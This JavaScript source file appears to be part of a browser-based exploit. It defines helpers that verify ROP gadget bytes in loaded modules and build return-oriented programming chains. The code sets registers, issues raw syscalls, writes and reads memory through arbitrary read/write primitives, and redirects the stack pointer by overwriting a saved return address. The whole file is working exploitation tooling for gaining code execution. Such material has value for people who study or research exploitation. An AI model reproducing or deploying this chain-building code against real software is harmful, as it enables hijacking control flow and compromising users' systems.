function gadget(instructions, module, address) {
	this.instructions = instructions;
	this.relativeAddress = address;
	this.checked = false;
	
	this.check = function() {
		if(!this.checked && this.instructions.length > 0) {
			var i;
			for(i = 0; i < this.instructions.length; i++) {
				if(getU8(moduleBases[module] + address + i) != this.instructions[i]) {
					return false;
				}
			}
			
			// Check ends with ret
			if(getU8(moduleBases[module] + address + this.instructions.length) != 0xc3) {
				return false;
			}
		}
		
		this.checked = true;
		return true;
	}
	
	this.address = function() {
		return moduleBases[module] + address;
	}
}

function rop(chainAddress) {
	var resp = getU64(stackBase + returnAddress);
	var chainAddress = chainAddress;
	var chainLength = 0;
	var variableAddresses = [];
	
	this.add = function() {
		var i;
		for(i = 0; i < arguments.length; i++) {
			if(typeof(arguments[i]) === "string") {
				if(gadgets[arguments[i]].check() == false) throw(gadgets[arguments[i]].relativeAddress);
				setU64(chainAddress + chainLength, gadgets[arguments[i]].address());
			}
			else {
				setU64(chainAddress + chainLength, arguments[i]);
			}
			
			chainLength += 8;
		}
		
		return chainLength;
	}
	
	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
		console.log("syscall " + name);
		
		this.add("pop rax", systemCallNumber);
		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
		this.add("pop rbp", stackBase + returnAddress - (chainLength + 8) + 0x1480);
		this.add("mov r10, rcx and syscall");
	}
	
	// Modifies rsi
	this.write_rax = function(address) {
		var valueAddress = this.add("pop rsi", address - 0x18) - 8;
		this.add("mov [rsi+0x18], rax");
		
		return valueAddress;
	}
	
	// Modifies rax
	this.write_rdx = function(address) {
		var valueAddress = this.add("pop rax", address - 0x1e8) - 8;
		this.add("mov [rax+0x1e8], rdx");
		
		return valueAddress;
	}
	
	this.read_rdi = function(address) {
		var valueAddress = this.add("pop rdi", address - 0x48) - 8;
		this.add("mov rdi, [rdi+0x48]");
		
		return valueAddress;
	}
	
	this.execute = function() {
		// Restore Stack Pointer
		this.add("pop rax", resp);
		this.write_rax(stackBase + returnAddress);
		this.add("pop rsp", stackBase + returnAddress);
		
		this.resolveVariables();
		
		// Redirect Stack Pointer to our ROP chain
		setU64(stackBase + returnAddress, gadgets["pop rsp"].address());
		setU64(stackBase + returnAddress + 8, chainAddress);
	}
	
	// Don't yet know where to store variables (depends on chainLength)
	// wait until entire ROP chain written, and evaluate the address in this.resolveVariables()
	this.write_rax_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rax(0), offset: -0x18 }); }
	this.write_rdx_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rdx(0), offset: -0x1e8 }); }
	this.read_rdi_FromVariable = function(n) { variableAddresses.push({ number: n, address: this.read_rdi(0), offset: -0x48 }); }
	
	this.resolveVariables = function() {
		var i;
		for(i = 0; i < variableAddresses.length; i++) {
			setU64(chainAddress + variableAddresses[i].address, chainAddress + chainLength + variableAddresses[i].offset + variableAddresses[i].number * 8);
		}
	}
	
	this.logVariable = function(n) {
		var v = getU64(chainAddress + chainLength + n * 8);
		var s = "Variable " + n.toString() + " = 0x" + v.toString(16);
		console.log(s);
	}
}
